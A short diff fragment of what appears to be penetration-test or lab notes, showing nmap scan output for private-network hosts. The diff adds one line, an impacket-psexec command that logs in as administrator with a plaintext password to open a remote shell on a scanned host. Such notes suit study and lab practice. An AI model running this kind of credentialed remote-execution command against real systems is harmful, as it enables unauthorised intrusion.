@@ -78,6 +78,8 @@ PORT     STATE SERVICE
 3389/tcp open  ms-wbt-server
 MAC Address: 02:2A:CB:0B:8D:55 (Unknown)
 
+**impacket-psexec administrator:swordfish@192.168.100.55**
+
 
 
 Nmap scan report for ip-192-168-100-63.eu-central-1.compute.internal (192.168.100.63)
